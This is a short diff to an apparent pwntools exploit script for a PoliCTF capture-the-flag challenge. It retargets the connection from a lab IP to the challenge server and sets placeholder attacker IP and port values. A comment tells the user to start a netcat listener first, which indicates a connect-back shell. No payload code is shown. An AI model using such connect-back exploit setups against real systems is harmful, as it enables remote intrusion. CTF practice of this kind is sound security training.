@@ -1,10 +1,10 @@
 from pwn import *
 import time
 
-r=remote("192.168.92.101",1234)
+r=remote("win.chall.polictf.it", 31337)
 #set here your ip address&port; start nc -l -p <your port> before continuing
-yourIP="127.0.0.1"
-yourPort="1235"
+yourIP="111.222.333.444"
+yourPort="1234"
 
 #context.log_level = "DEBUG"
 
